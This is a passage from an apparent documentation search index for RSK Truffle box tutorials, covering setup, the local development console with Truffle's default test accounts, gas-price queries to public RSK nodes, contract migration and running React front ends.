(7) 1d4c74dfa4e99e161130c18cc63938bb120a128cefbf1b9188efc678bf5722cb (8) 0f44e0becf2e090db498a1b747d2a758fcc81fb0241f350d61117a9c6b1fa82e (9) 85218c5eec657470dafeb09e6f7101f91d21bfe822fbeeecfc9275f798662a63 Mnemonic: virtual valve razor retreat either turn possible student grief engage attract fiber \u26a0\ufe0f Important \u26a0\ufe0f : This mnemonic was created for you by Truffle. It is not secure. Ensure you do not use it on production blockchains, or else you risk losing funds. truffle(develop)> Take a look at the smart contract SimpleStorage.sol . You can check it out in folder contracts . This smart contract has: A variable storedData to store a number A function get() to return the number stored at variable storedData A function set() to change the number stored at variable storedData Compile and migrate the smart contract. Note inside the development console we don't preface commands with truffle. To make sure you're in the development console, the command prompt must be truffle(develop)> compile The compile output should be similar to: migrate And the migrate output should be similar to: Running contract tests. Our box also comes with the file TestSimpleStorage.js for testing the smart contract. You can check it out in the test folder. Run this command in the development console: test This test output should be similar to: Note the command varies slightly if you're in or outside of the development console. // inside the development console. test // outside the development console. truffle test", "title": "Development console"}, {"location": "boxes/rsk-next-box/#client-side-application", "text": "Our box has done a front end to interact with the smart contract, built using React app and Next JS. In another terminal (i.e. not in the truffle develop prompt), go to the app directory and run the React app. Do not close the other terminal, which is running the Truffle development console, because it is our Blockchain simulator. If you close it and then open it again, you need to deploy / migrate the smart contract again too! cd app npm run dev Then go to your browser at http://localhost:3000/ Smart contract changes must be manually recompiled and migrated! NOTE : This box is the starting point for the RSK tutorial Using rsk-next-box .", "title": "Client side application"}, {"location": "boxes/rsk-next-box/#using-rsk-networks", "text": "", "title": "Using RSK networks"}, {"location": "boxes/rsk-next-box/#setup-an-account-get-r-btc", "text": "Get an address, learning how works the account based RSK addresses . For the RSK Testnet, get tR-BTC from our faucet . For the RSK Mainnet, get R-BTC from an exchange .", "title": "Setup an account &amp; get R-BTC"}, {"location": "boxes/rsk-next-box/#setup-the-gas-price", "text": "Gas is the internal pricing for running a transaction or contract. When you send tokens, interact with a contract, send R-BTC, or do anything else on the blockchain, you must pay for that computation. That payment is calculated as gas. In RSK, this is paid in R-BTC . The minimumGasPrice is written in the block header by miners and establishes the minimum gas price that a transaction should have in order to be included in that block. To update the minimumGasPrice in our project run this query using cURL: Testnet curl https://public-node.testnet.rsk.co/ -X POST -H \"Content-Type: application/json\" \\ --data '{\"jsonrpc\":\"2.0\",\"method\":\"eth_getBlockByNumber\",\"params\":[\"latest\",false],\"id\":1}' \\ > .minimum-gas-price-testnet.json Mainnet curl https://public-node.rsk.co/ -X POST -H \"Content-Type: application/json\" \\ --data '{\"jsonrpc\":\"2.0\",\"method\":\"eth_getBlockByNumber\",\"params\":[\"latest\",false],\"id\":1}' \\ > .minimum-gas-price-mainnet.json This query saved the details of latest block to file .minimum-gas-price-testnet.json or .minimum-gas-price-mainnet.json, respectively. In the truffle-config.js , we are reading the parameter minimumGasPrice in each json file. For more information about the Gas and minimumGasPrice please go to gas page .", "title": "Setup the gas price"}, {"location": "boxes/rsk-next-box/#connect-to-rsk", "text": "Copy your mnemonic to truffle-config.js //Put your mnemonic here, be careful not to deploy your mnemonic into production! const mnemonic = 'A_MNEMONIC' ; Please be aware that we are using HDWalletProvider with RSK Networks derivations path: - RSK Mainnet dpath: m/44\u2019/137\u2019/0\u2019/0 - RSK Testnet dpath: m/44\u2019/37310\u2019/0\u2019/0 For more information check RSKIP57 . Run the development console for any RSK network. # Console for Testnet truffle console --network testnet # Console for Mainnet truffle console --network mainnet Migrate the smart contracts. We will do it running the below commands directly in the terminal, without using the truffle console now to show to you this alternative. truffle migrate Update Express JS component. The component located in the file web3-util.js uses the web3.js library to interact with the blockchain - writing code that reads and writes data from the blockchain with smart contracts. Choose which network you would like to connect the server to RSK Network and update line 15 of the file app/utils/web3-util.js Testnet const provider = new Web3 . providers . HttpProvider ( \"https://public-node.testnet.rsk.co\" ); Mainnet const provider = new Web3 . providers . HttpProvider ( \"https://public-node.rsk.co\" ); In a terminal, go to the app directory and run the React app. cd app npm run dev Go to your browser at http://localhost:3000/ Note that when you are connected to an RSK network, you do not need to leave open the Truffle console, because the app is connected via a public node, directly to the network.", "title": "Connect to RSK"}, {"location": "boxes/rsk-next-box/#next-steps", "text": "Go to tutorial Go to the tutorial using rsk-next-box to learn more about this project. We covered all the steps with more details, explanations, and images. Find more documentation Check out the RSK developers portal . Do you have questions? Ask in RSK chat .", "title": "Next steps"}, {"location": "boxes/rsk-plant-box/", "text": "RSK Truffle Plant Box \u00b6 Truffle box is configured to create a complete dApp using Truffle framework on RSK Blockchain , including a user interface to interact with the smart contract. RSK is an open source platform for Ethereum compatible smart contracts based on the Bitcoin network. It was inspired by Truffle pet shop box . Thanks, Truffle team :) Requirements \u00b6 There are a few technical requirements before we start. To use Truffle boxes , you need to have installed in your computer: Git a POSIX compliant shell cURL Node.js and NPM a code editor If you don't have any of them installed, go to the tutorial Truffle boxes prerequisites which have all the instructions to setup these requirements. Truffle framework Once you have those requirements installed, you only need one command to install Truffle . It is better to do it globally: npm install -g truffle Installing the Truffle box \u00b6 Create a new folder. For example, create the folder rsk-plant . Navigate to the folder in the terminal. mkdir rsk-plant cd rsk-plant Run the unbox command. This also takes care of installing the necessary dependencies and it can take some time. truffle unbox rsksmart/rsk-plant-box This is the result using Windows OS: PlantShop.sol \u00b6 Take a look at the smart contract PlantShop.sol . You can check it out in folder contracts . This smart contract has: A variable buyers to store an array with 16 posisions to store addresses A function getBuyers to return the list of addresses stored at variable buyers A function buy to update an address at variable buyers , in the number of position sent as parameter Development console \u00b6 Truffle has an interactive console that also spawns a development blockchain. This is very useful for compiling, deploying and testing locally. Run the development console. This command is successful if you see a list of 10 accounts, a mnemonic and the command prompt is now truffle(develop)> truffle develop You will now be in the truffle develop console with seeded accounts and their associated private keys listed. C:\\RSK\\rsk-plant>truffle develop Truffle Develop started at http://127.0.0.1:8545/ Accounts: (0) 0x1056f747cf4bc7710e178b2aeed4eb8c8506c728 (1) 0x45a71c00382c2898b5d6fae69a6f7bfe6edab80c (2) 0x1596384706dc9ac4cca7f50279a4abe591d6c3fe (3) 0x9576d0a496b645baa64f22aceb2328e7468d4113 (4) 0xd431572eef7d77584d944c1809398a155e89f830 (5) 0x92c111839718fe0800fadccc67068b40b8524a0f (6) 0x6da22b5a027146619bfe6704957f7f36ff029c48 (7) 0x2c3a82d8c3993f8c80dcaf91025437bd057df867 (8) 0xc43ae7a44f7deb759177b7093f06512a0a9ff5d7 (9) 0xe61bf00cd7dce248449cfe58f23a4ef7d542bc0b Private Keys: (0) f32f32839fe27ad906b63eafb326f26fed95c231e3c5e33c7cdd08f62db63167 (1) ebef990088f27f6ef13b5e52a77d5dcc5a76862a701908c586d01b6fe93562b3 (2) 598ccae5e4436fedeb0e798c0d254789c55a63401ebfc3ae8ddde29634ddfcde (3) 09934b80f391e0024b8cb00cd73790fdf64c4d0509e144766414fee317cd3f4e (4) ac745b84b6574b5738d364b43e0d471c9d5107504acc709c90f6f091b78c751b (5) 449654cde095f2349113ef12a93e139b4302bc95adb3619d08adf53dde9b8847 (6) c217f12a89c352fc70b5f1bd5742314b4fb1bb1e35cb779fdb3c2390106355db (7) 1d4c74dfa4e99e161130c18cc63938bb120a128cefbf1b9188efc678bf5722cb (8) 0f44e0becf2e090db498a1b747d2a758fcc81fb0241f350d61117a9c6b1fa82e (9) 85218c5eec657470dafeb09e6f7101f91d21bfe822fbeeecfc9275f798662a63 Mnemonic: virtual valve razor retreat either turn possible student grief engage attract fiber \u26a0\ufe0f Important \u26a0\ufe0f : This mnemonic was created for you by Truffle. It is not secure. Ensure you do not use it on production blockchains, or else you risk losing funds. truffle(develop)> Inside the development console we don't preface commands with truffle . Compile the smart contract. To make sure you're in the development console, the command prompt must be truffle(develop)> compile The compile output should be similar to: Deploy (migrate) the smart contract. migrate And the migrate output should be similar to: Testing the smart contract. This Truffle box also comes with the file TestPlantShop.js which include some examples for testing the smart contract. You can check it out in the test folder. Run this command in the development console: test The test output should be similar to: Exit Truffle console \u00b6 In the Truffle console, enter this command to exit the terminal: .exit Using RSK networks \u00b6 This Truffle box is already configured to connect to three RSK networks: regtest (local node) testnet mainnet Testnet will be used here. We need to do some tasks: Setup an account and get R-BTC Update RSK network gas price Connect to an RSK network Deploy in the network of your choose Setup an account & get R-BTC \u00b6 Create a wallet The easy way to setup an account is using a web3 wallet injected in the browser. Some options are: - Metamask - Nifty Select the RSK Network in the web wallet. - Nifty: select in the dropdown list - Metamask: go to RSK Testnet to configure it in Custom RPC You can learn more about account based RSK addresses . Take a look truffle-config.js file to realize that we are using HDWalletProvider with RSK Networks derivations path: - RSK Testnet dpath: m/44\u2019/37310\u2019/0\u2019/0 - RSK Mainnet dpath: m/44\u2019/137\u2019/0\u2019/0 For more information check RSKIP57 . Update .secret file After create your wallet, update your mnemonic in the file .secret , located in the folder project, and save it. Get some R-BTCs: For the RSK Testnet, get tR-BTC from our faucet . Setup the gas price \u00b6 Gas is the internal pricing for running a transaction or contract. When you send tokens, interact with a contract, send R-BTC, or do anything else on the blockchain, you must pay for that computation. That payment is calculated as gas. In RSK, this is paid in R-BTC . The minimumGasPrice is written in the block header by miners and establishes the minimum gas price that a transaction should have in order to be included in that block. To update the Testnet minimumGasPrice in our project run this query using cURL: curl https://public-node.testnet.rsk.co/ -X POST -H \"Content-Type: application/json\" --data '{\"jsonrpc\":\"2.0\",\"method\":\"eth_getBlockByNumber\",\"params\":[\"latest\",false],\"id\":1}' > .minimum-gas-price-testnet.json This query saved the details of latest block to file .minimum-gas-price-testnet.json In the truffle-config.js , we are reading the parameter minimumGasPrice from this json file. For more information about the Gas and minimumGasPrice please go to the gas page . Connect to RSK Testnet \u00b6 Run the development console for any RSK network. truffle console --network testnet Test the connection to RSK network \u00b6 Run this commands in the Truffle console: Block number Shows the last block number. ( await web3 . eth . getBlockNumber ()). toString () Network ID To get the network ID, run this command: ( await web3 . eth . net . getId ()). toString () List of network IDs: - mainnet: 30 - testnet: 31 - regtest (local node): 33 Check it out the last steps in this image: You can verify that I get the last block twice, and the block number inscreased, so we conclude that the connection is ok. Exit the Truffle console: .exit Migrate the smart contract \u00b6 We will do it running the below commands directly in the terminal, without using the Truffle console, to show you this alternative. On any of the networks, run this commands in a terminal (not in Truffle console). To use Testnet or Mainnet, you need to specify this using the parameter -- network : truffle migrate --network testnet The migrate process in a real blockchain takes more time, because Truffle creates some transactions which need to be mined on the blockchain. The dApp \u00b6 Included with the plant-shop Truffle Box was the code for the app's front-end. That code exists within the src directory. Make sure you have selected the RSK testnet in the wallet. Running the dev server \u00b6 Now we're ready to use our dapp! Start the local web server: npm run dev The dev server will launch and automatically open a new browser tab containing your dapp. It is running at http://localhost:3000 Buying plants \u00b6 In our garden store, don't worry about the prices, the plants are free! Click the Get button on the plant of your choice. You'll be automatically prompted to approve the transaction by the web wallet. Click submit / confirm to approve the transaction. After the transaction is confirmed, you'll see the button next to the choosed plant change to show the first characters of the wallet that got the plant and become disabled, just as we specified, because the plant has now been acquired. Congratulations\ud83d\udc4f\ud83d\udc4f\ud83d\udc4f! You built and ran a complete dApp on RSK network! Do you have questions? \u00b6 Ask in the RSK chat .", "title": "RSK Truffle Plant Box"}, {"location": "boxes/rsk-plant-box/#rsk-truffle-plant-box", "text": "Truffle box is configured to create a complete dApp using Truffle framework on RSK Blockchain , including a user interface to interact with the smart contract. RSK is an open source platform for Ethereum compatible smart contracts based on the Bitcoin network. It was inspired by Truffle pet shop box . Thanks, Truffle team :)", "title": "RSK Truffle Plant Box"}, {"location": "boxes/rsk-plant-box/#requirements", "text": "There are a few technical requirements before we start. To use Truffle boxes , you need to have installed in your computer: Git a POSIX compliant shell cURL Node.js and NPM a code editor If you don't have any of them installed, go to the tutorial Truffle boxes prerequisites which have all the instructions to setup these requirements. Truffle framework Once you have those requirements installed, you only need one command to install Truffle . It is better to do it globally: npm install -g truffle", "title": "Requirements"}, {"location": "boxes/rsk-plant-box/#installing-the-truffle-box", "text": "Create a new folder. For example, create the folder rsk-plant . Navigate to the folder in the terminal. mkdir rsk-plant cd rsk-plant Run the unbox command. This also takes care of installing the necessary dependencies and it can take some time. truffle unbox rsksmart/rsk-plant-box This is the result using Windows OS:", "title": "Installing the Truffle box"}, {"location": "boxes/rsk-plant-box/#plantshopsol", "text": "Take a look at the smart contract PlantShop.sol . You can check it out in folder contracts . This smart contract has: A variable buyers to store an array with 16 posisions to store addresses A function getBuyers to return the list of addresses stored at variable buyers A function buy to update an address at variable buyers , in the number of position sent as parameter", "title": "PlantShop.sol"}, {"location": "boxes/rsk-plant-box/#development-console", "text": "Truffle has an interactive console that also spawns a development blockchain. This is very useful for compiling, deploying and testing locally. Run the development console. This command is successful if you see a list of 10 accounts, a mnemonic and the command prompt is now truffle(develop)> truffle develop You will now be in the truffle develop console with seeded accounts and their associated private keys listed. C:\\RSK\\rsk-plant>truffle develop Truffle Develop started at http://127.0.0.1:8545/ Accounts: (0) 0x1056f747cf4bc7710e178b2aeed4eb8c8506c728 (1) 0x45a71c00382c2898b5d6fae69a6f7bfe6edab80c (2) 0x1596384706dc9ac4cca7f50279a4abe591d6c3fe (3) 0x9576d0a496b645baa64f22aceb2328e7468d4113 (4) 0xd431572eef7d77584d944c1809398a155e89f830 (5) 0x92c111839718fe0800fadccc67068b40b8524a0f (6) 0x6da22b5a027146619bfe6704957f7f36ff029c48 (7) 0x2c3a82d8c3993f8c80dcaf91025437bd057df867 (8) 0xc43ae7a44f7deb759177b7093f06512a0a9ff5d7 (9) 0xe61bf00cd7dce248449cfe58f23a4ef7d542bc0b Private Keys: (0) f32f32839fe27ad906b63eafb326f26fed95c231e3c5e33c7cdd08f62db63167 (1) ebef990088f27f6ef13b5e52a77d5dcc5a76862a701908c586d01b6fe93562b3 (2) 598ccae5e4436fedeb0e798c0d254789c55a63401ebfc3ae8ddde29634ddfcde (3) 09934b80f391e0024b8cb00cd73790fdf64c4d0509e144766414fee317cd3f4e (4) ac745b84b6574b5738d364b43e0d471c9d5107504acc709c90f6f091b78c751b (5) 449654cde095f2349113ef12a93e139b4302bc95adb3619d08adf53dde9b8847 (6) c217f12a89c352fc70b5f1bd5742314b4fb1bb1e35cb779fdb3c2390106355db (7) 1d4c74dfa4e99e161130c18cc63938bb120a128cefbf1b9188efc678bf5722cb (8) 0f44e0becf2e090db498a1b747d2a758fcc81fb0241f350d61117a9c6b1fa82e (9) 85218c5eec657470dafeb09e6f7101f91d21bfe822fbeeecfc9275f798662a63 Mnemonic: virtual valve razor retreat either turn possible student grief engage attract fiber \u26a0\ufe0f Important \u26a0\ufe0f : This mnemonic was created for you by Truffle. It is not secure. Ensure you do not use it on production blockchains, or else you risk losing funds. truffle(develop)> Inside the development console we don't preface commands with truffle . Compile the smart contract. To make sure you're in the development console, the command prompt must be truffle(develop)> compile The compile output should be similar to: Deploy (migrate) the smart contract. migrate And the migrate output should be similar to: Testing the smart contract. This Truffle box also comes with the file TestPlantShop.js which include some examples for testing the smart contract. You can check it out in the test folder. Run this command in the development console: test The test output should be similar to:", "title": "Development console"}, {"location": "boxes/rsk-plant-box/#exit-truffle-console", "text": "In the Truffle console, enter this command to exit the terminal: .exit", "title": "Exit Truffle console"}, {"location": "boxes/rsk-plant-box/#using-rsk-networks", "text": "This Truffle box is already configured to connect to three RSK networks: regtest (local node) testnet mainnet Testnet will be used here. We need to do some tasks: Setup an account and get R-BTC Update RSK network gas price Connect to an RSK network Deploy in the network of your choose", "title": "Using RSK networks"}, {"location": "boxes/rsk-plant-box/#setup-an-account-get-r-btc", "text": "Create a wallet The easy way to setup an account is using a web3 wallet injected in the browser. Some options are: - Metamask - Nifty Select the RSK Network in the web wallet. - Nifty: select in the dropdown list - Metamask: go to RSK Testnet to configure it in Custom RPC You can learn more about account based RSK addresses . Take a look truffle-config.js file to realize that we are using HDWalletProvider with RSK Networks derivations path: - RSK Testnet dpath: m/44\u2019/37310\u2019/0\u2019/0 - RSK Mainnet dpath: m/44\u2019/137\u2019/0\u2019/0 For more information check RSKIP57 . Update .secret file After create your wallet, update your mnemonic in the file .secret , located in the folder project, and save it. Get some R-BTCs: For the RSK Testnet, get tR-BTC from our faucet .", "title": "Setup an account &amp; get R-BTC"}, {"location": "boxes/rsk-plant-box/#setup-the-gas-price", "text": "Gas is the internal pricing for running a transaction or contract. When you send tokens, interact with a contract, send R-BTC, or do anything else on the blockchain, you must pay for that computation. That payment is calculated as gas. In RSK, this is paid in R-BTC . The minimumGasPrice is written in the block header by miners and establishes the minimum gas price that a transaction should have in order to be included in that block. To update the Testnet minimumGasPrice in our project run this query using cURL: curl https://public-node.testnet.rsk.co/ -X POST -H \"Content-Type: application/json\" --data '{\"jsonrpc\":\"2.0\",\"method\":\"eth_getBlockByNumber\",\"params\":[\"latest\",false],\"id\":1}' > .minimum-gas-price-testnet.json This query saved the details of latest block to file .minimum-gas-price-testnet.json In the truffle-config.js , we are reading the parameter minimumGasPrice from this json file. For more information about the Gas and minimumGasPrice please go to the gas page .", "title": "Setup the gas price"}, {"location": "boxes/rsk-plant-box/#connect-to-rsk-testnet", "text": "Run the development console for any RSK network. truffle console --network testnet", "title": "Connect to RSK Testnet"}, {"location": "boxes/rsk-plant-box/#test-the-connection-to-rsk-network", "text": "Run this commands in the Truffle console: Block number Shows the last block number. ( await web3 . eth . getBlockNumber ()). toString () Network ID To get the network ID, run this command: ( await web3 . eth . net . getId ()). toString () List of network IDs: - mainnet: 30 - testnet: 31 - regtest (local node): 33 Check it out the last steps in this image: You can verify that I get the last block twice, and the block number inscreased, so we conclude that the connection is ok. Exit the Truffle console: .exit", "title": "Test the connection to RSK network"}, {"location": "boxes/rsk-plant-box/#migrate-the-smart-contract", "text": "We will do it running the below commands directly in the terminal, without using the Truffle console, to show you this alternative. On any of the networks, run this commands in a terminal (not in Truffle console). To use Testnet or Mainnet, you need to specify this using the parameter -- network : truffle migrate --network testnet The migrate process in a real blockchain takes more time, because Truffle creates some transactions which need to be mined on the blockchain.", "title": "Migrate the smart contract"}, {"location": "boxes/rsk-plant-box/#the-dapp", "text": "Included with the plant-shop Truffle Box was the code for the app's front-end. That code exists within the src directory. Make sure you have selected the RSK testnet in the wallet.", "title": "The dApp"}, {"location": "boxes/rsk-plant-box/#running-the-dev-server", "text": "Now we're ready to use our dapp! Start the local web server: npm run dev The dev server will launch and automatically open a new browser tab containing your dapp. It is running at http://localhost:3000", "title": "Running the dev server"}, {"location": "boxes/rsk-plant-box/#buying-plants", "text": "In our garden store, don't worry about the prices, the plants are free! Click the Get button on the plant of your choice. You'll be automatically prompted to approve the transaction by the web wallet. Click submit / confirm to approve the transaction. After the transaction is confirmed, you'll see the button next to the choosed plant change to show the first characters of the wallet that got the plant and become disabled, just as we specified, because the plant has now been acquired. Congratulations\ud83d\udc4f\ud83d\udc4f\ud83d\udc4f! You built and ran a complete dApp on RSK network!", "title": "Buying plants"}, {"location": "boxes/rsk-plant-box/#do-you-have-questions", "text": "Ask in the RSK chat .", "title": "Do you have questions?"}, {"location": "boxes/rsk-react-box/", "text": "RSK React Truffle Box \u00b6 This box comes with everything you need to start using smart contracts from a react app on RSK Network. This box was ported and adapted from React Truffle Box to RSK. Installation \u00b6 First ensure you are in a new and empty directory. Run the unbox command via npx and skip to step 3. This will install all necessary dependencies. A Create-React-App is generated in the client directory. npx truffle unbox rsksmart / rsk - react - box Alternatively, you can install Truffle globally and run the unbox command. npm install - g truffle truffle unbox rsksmart / rsk - react - box Run the development console. truffle develop Compile and migrate the smart contracts. Note inside the development console we don't preface commands with truffle . compile migrate In the client directory, we run the React app. Smart contract changes must be manually recompiled and migrated. // in another terminal (i.e. not in the truffle develop prompt) cd client npm run start Truffle can run tests written in Solidity or JavaScript against your smart contracts. Note the command varies slightly if you're in or outside of the development console. // inside the development console. test // outside the development console.. truffle test Jest is included for testing React components. Compile your contracts before running Jest, or you may receive some file not found errors. // ensure you are inside the client directory when running this npm run test To build the application for production, use the build script. A production build will be in the client/build folder. // ensure you are inside the client directory when running this npm run build RSK \u00b6 Setup an account & get R-BTC \u00b6 Get an address using these instructions . For the RSK Testnet, get tR-BTC from our faucet . For the RSK Mainnet, get R-BTC from an exchange . Setup the gas price \u00b6 Gas is the internal pricing for running a transaction or contract. When you send tokens, interact with a contract, send RBTC, or do anything else on the blockchain, you must pay for that computation. That payment is calculated as gas. In RSK, this is paid in R-BTC . The minimumGasPrice is written in the block header by miners and establishes the minimum gas price that a transaction should have in order to be included in that block. To get the minimumGasPrice do the following steps: 1. Run this query using cURL: **Mainnet** ```shell curl https://public-node.rsk.co/ \\ -X POST -H \"Content-Type: application/json\" \\ --data '{\"jsonrpc\":\"2.0\",\"method\":\"eth_getBlockByNumber\",\"params\":[\"latest\",false],\"id\":1}' ``` **Testnet** ```shell curl https://public-node.testnet.rsk.co/ \\ -X POST -H \"Content-Type: application/json\" \\ --data '{\"jsonrpc\":\"2.0\",\"method\":\"eth_getBlockByNumber\",\"params\":[\"latest\",false],\"id\":1}' ``` Find in the result the field minimumGasPrice For more information about the Gas and minimumGasPrice please go here . Connect to RSK \u00b6 Copy your mnemonic to truffle-config.js // truffle-config.json const HDWalletProvider = require ( '@truffle/hdwallet-provider' ); //Put your mnemonic here, be careful not to deploy your mnemonic into production! const mnemonic = 'A_MNEMONIC' ; Please be aware that we are using HDWalletProvider with RSK Networks derivations path: - RSK Mainnet dpath: m/44\u2019/137\u2019/0\u2019/0 - RSK Testnet dpath: m/44\u2019/37310\u2019/0\u2019/0 For more information check RSKIP57 . Check the gas price of the network, and update truffle-config.js if necessary. Run the development console for any RSK network. # Console for Mainnet truffle console --network mainnet # Console forn Testnet truffle console --network testnet Compile and migrate the smart contracts. Note that inside the development console, we don't preface commands with truffle. compile migrate Then continue from step 5 of installation steps", "title": "RSK React Truffle Box"}, {"location": "boxes/rsk-react-box/#rsk-react-truffle-box", "text": "This box comes with everything you need to start using smart contracts from a react app on RSK Network. This box was ported and adapted from React Truffle Box to RSK.", "title": "RSK React Truffle Box"}, {"location": "boxes/rsk-react-box/#installation", "text": "First ensure you are in a new and empty directory. Run the unbox command via npx and skip to step 3. This will install all necessary dependencies. A Create-React-App is generated in the client directory. npx truffle unbox rsksmart / rsk - react - box Alternatively, you can install Truffle globally and run the unbox command. npm install - g truffle truffle unbox rsksmart / rsk - react - box Run the development console. truffle develop Compile and migrate the smart contracts. Note inside the development console we don't preface commands with truffle . compile migrate In the client directory, we run the React app. Smart contract changes must be manually recompiled and migrated. // in another terminal (i.e. not in the truffle develop prompt) cd client npm run start Truffle can run tests written in Solidity or JavaScript against your smart contracts. Note the command varies slightly if you're in or outside of the development console. // inside the development console. test // outside the development console.. truffle test Jest is included for testing React components. Compile your contracts before running Jest, or you may receive some file not found errors. // ensure you are inside the client directory when running this npm run test To build the application for production, use the build script. A production build will be in the client/build folder. // ensure you are inside the client directory when running this npm run build", "title": "Installation"}, {"location": "boxes/rsk-react-box/#rsk", "text": "", "title": "RSK"}, {"location": "boxes/rsk-react-box/#setup-an-account-get-r-btc", "text": "Get an address using these instructions . For the RSK Testnet, get tR-BTC from our faucet . For the RSK Mainnet, get R-BTC from an exchange .", "title": "Setup an account &amp; get R-BTC"}, {"location": "boxes/rsk-react-box/#setup-the-gas-price", "text": "Gas is the internal pricing for running a transaction or contract. When you send tokens, interact with a contract, send RBTC, or do anything else on the blockchain, you must pay for that computation. That payment is calculated as gas. In RSK, this is paid in R-BTC . The minimumGasPrice is written in the block header by miners and establishes the minimum gas price that a transaction should have in order to be included in that block. To get the minimumGasPrice do the following steps: 1. Run this query using cURL: **Mainnet** ```shell curl https://public-node.rsk.co/ \\ -X POST -H \"Content-Type: application/json\" \\ --data '{\"jsonrpc\":\"2.0\",\"method\":\"eth_getBlockByNumber\",\"params\":[\"latest\",false],\"id\":1}' ``` **Testnet** ```shell curl https://public-node.testnet.rsk.co/ \\ -X POST -H \"Content-Type: application/json\" \\ --data '{\"jsonrpc\":\"2.0\",\"method\":\"eth_getBlockByNumber\",\"params\":[\"latest\",false],\"id\":1}' ``` Find in the result the field minimumGasPrice For more information about the Gas and minimumGasPrice please go here .", "title": "Setup the gas price"}, {"location": "boxes/rsk-react-box/#connect-to-rsk", "text": "Copy your mnemonic to truffle-config.js // truffle-config.json const HDWalletProvider = require ( '@truffle/hdwallet-provider' ); //Put your mnemonic here, be careful not to deploy your mnemonic into production! const mnemonic = 'A_MNEMONIC' ; Please be aware that we are using HDWalletProvider with RSK Networks derivations path: - RSK Mainnet dpath: m/44\u2019/137\u2019/0\u2019/0 - RSK Testnet dpath: m/44\u2019/37310\u2019/0\u2019/0 For more information check RSKIP57 . Check the gas price of the network, and update truffle-config.js if necessary. Run the development console for any RSK network. # Console for Mainnet truffle console --network mainnet # Console forn Testnet truffle console --network testnet Compile and migrate the smart contracts. Note that inside the development console, we don't preface commands with truffle. compile migrate Then continue from step 5 of installation steps", "title": "Connect to RSK"}, {"location": "boxes/rsk-react-express-box/", "text": "RSK React + Express JS Box \u00b6 This box comes with everything you need to start using express JS to provide API endpoints to smart contracts and a react app to interact with them on RSK Blockchain . It includes network configurations for Mainnet, Testnet and the SimpleStorage contract as an example to deploy. Requirements \u00b6 NPM (Node Package Manager) and Node.js are needed, though both are usually installed at once. Go to Node.js if you need to install it. Truffle Install Truffle globally: npm install -g truffle Installation \u00b6 Create a new folder. For example, create the folder rsk-react-express . Navigate to the folder in the terminal. mkdir rsk-react-express cd rsk-react-express Run the unbox command. It can take some time, as this will install all necessary dependencies. truffle unbox rsksmart/rsk-react-express-box A client-server application is generated in the app directory. This is the result using Windows OS: Development console \u00b6 Truffle has an interactive console that also spawns a development blockchain. This is very useful for compiling, deploying and testing locally. Run the development console. This command is successful if you see a list of 10 accounts, a mnemonic and the command prompt is now truffle(develop)> truffle develop You will now be in the truffle develop REPL with seeded accounts and their associated private keys listed. C:\\RSK\\rsk-next>truffle develop Truffle Develop started at http://127.0.0.1:8545/ Accounts: (0) 0x1056f747cf4bc7710e178b2aeed4eb8c8506c728 (1) 0x45a71c00382c2898b5d6fae69a6f7bfe6edab80c (2) 0x1596384706dc9ac4cca7f50279a4abe591d6c3fe (3) 0x9576d0a496b645baa64f22aceb2328e7468d4113 (4) 0xd431572eef7d77584d944c1809398a155e89f830 (5) 0x92c111839718fe0800fadccc67068b40b8524a0f (6) 0x6da22b5a027146619bfe6704957f7f36ff029c48 (7) 0x2c3a82d8c3993f8c80dcaf91025437bd057df867 (8) 0xc43ae7a44f7deb759177b7093f06512a0a9ff5d7 (9) 0xe61bf00cd7dce248449cfe58f23a4ef7d542bc0b Private Keys: (0) f32f32839fe27ad906b63eafb326f26fed95c231e3c5e33c7cdd08f62db63167 (1) ebef990088f27f6ef13b5e52a77d5dcc5a76862a701908c586d01b6fe93562b3 (2) 598ccae5e4436fedeb0e798c0d254789c55a63401ebfc3ae8ddde29634ddfcde (3) 09934b80f391e0024b8cb00cd73790fdf64c4d0509e144766414fee317cd3f4e (4) ac745b84b6574b5738d364b43e0d471c9d5107504acc709c90f6f091b78c751b (5) 449654cde095f2349113ef12a93e139b4302bc95adb3619d08adf53dde9b8847 (6) c217f12a89c352fc70b5f1bd5742314b4fb1bb1e35cb779fdb3c2390106355db (7) 1d4c74dfa4e99e161130c18cc63938bb120a128cefbf1b9188efc678bf5722cb (8) 0f44e0becf2e090db498a1b747d2a758fcc81fb0241f350d61117a9c6b1fa82e (9) 85218c5eec657470dafeb09e6f7101f91d21bfe822fbeeecfc9275f798662a63 Mnemonic: virtual valve razor retreat either turn possible student grief engage attract fiber \u26a0\ufe0f Important \u26a0\ufe0f : This mnemonic was created for you by Truffle. It is not secure. Ensure you do not use it on production blockchains, or else you risk losing funds. truffle(develop)> Take a look at the smart contract SimpleStorage.sol . You can check it out in folder contracts . This smart contract has: A variable storedData to store a number A function get() to return the number stored at variable storedData A function set() to change the number stored at variable storedData Compile and migrate the smart contract. Note, inside the development console we don't preface commands with truffle . To make sure you're in the development console, the command prompt must be truffle(develop)> compile The compile output should be similar to: migrate And the migrate output should be similar to: Running contract tests. This Truffle box also comes with the file TestSimpleStorage.js for testing the smart contract. You can check it out in the test folder. Run this command in the development console: test This test output should be similar to: Note the command varies slightly if you're in or outside of the development console. // inside the development console. test // outside the development console. truffle test The application \u00b6 Our box is a client-server: - Server uses express JS to interact with the smart contract. - Client uses react app. Running in development mode In another terminal (i.e. not in the truffle develop prompt), go to the app directory and run the app in development mode. Do not close the other terminal, which is running the Truffle development console, because it is our Blockchain simulator. If you close it and then open it again, you need to deploy / migrate the smart contract again too! cd app npm run dev This command executes server and client applications and you can access it in your browser: Server: http://localhost:8080/ Client: http://localhost:3000/ Smart contract changes must be manually recompiled and migrated! NOTE : This box is the starting point for the RSK tutorial using rsk-react-express-box . Running the production server You can choose to run only the production server. In another terminal (i.e. not in the truffle develop prompt), go to the app directory and run the app in production mode. cd app npm start If you have yarn installed, you can use yarn start . Then go to your browser at http://localhost:8080/ When you are running only the production server, for any change you need to stop and run the server again for the updates to take effect! To build the application for production, use the build script in the app folder. A production build will be in the app/dist folder. npm run build Take a look in the app/dist folder: Using RSK networks \u00b6 This Truffle box is already configured to connect to both RSK networks: testnet and mainnet. We need only to update few items: Setup an account & get R-BTC RSK network gas price Your wallet mnemonic Choose the network in the app Setup an account & get R-BTC \u00b6 Get an address, learning how works the account based RSK addresses . For the RSK Testnet, get tR-BTC from our faucet . For the RSK Mainnet, get R-BTC from an exchange . Setup the gas price \u00b6 Gas is the internal pricing for running a transaction or contract. When you send tokens, interact with a contract, send R-BTC, or do anything else on the blockchain, you must pay for that computation. That payment is calculated as gas. In RSK, this is paid in R-BTC . The minimumGasPrice is written in the block header by miners and establishes the minimum gas price that a transaction should have in order to 